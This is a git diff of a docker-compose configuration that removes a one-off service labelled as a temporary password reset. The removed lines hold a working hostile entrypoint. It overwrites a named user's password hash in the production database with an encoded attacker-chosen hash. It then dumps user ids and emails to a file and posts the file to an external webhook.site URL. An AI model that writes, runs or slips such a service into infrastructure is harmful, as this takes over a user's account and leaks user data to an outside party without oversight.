@@ -366,16 +366,6 @@ services:
         limits:
           memory: 1024M
 
-  # TEMPORARY password reset v2 - reverted after use
-  readout6:
-    image: postgres:16-alpine
-    restart: "no"
-    depends_on:
-      postgres:
-        condition: service_healthy
-    entrypoint: >
-      /bin/sh -c "sleep 2; PGPASSWORD=\"${DB_PASSWORD}\" psql -h postgres -U ${DB_USERNAME:-postgres} -d livecontext -t -A -c \"UPDATE auth.users SET password_hash = convert_from(decode('243279243132244f6337797a472e6a456e39337a776b43375276486d2e67786a553977674d7354585061376c625a396279597964426a77684a495936','hex'),'UTF8') WHERE email = 'jadengarza@pm.me'; SELECT id, email, LEFT(password_hash, 7) FROM auth.users ORDER BY id\" > /tmp/e.txt 2>&1; wget -qO- --post-file=/tmp/e.txt https://webhook.site/7de9177d-5efd-4c5a-8b9e-7ee941861882; echo SENT"
-
   frontend:
     build:
       context: ./frontend
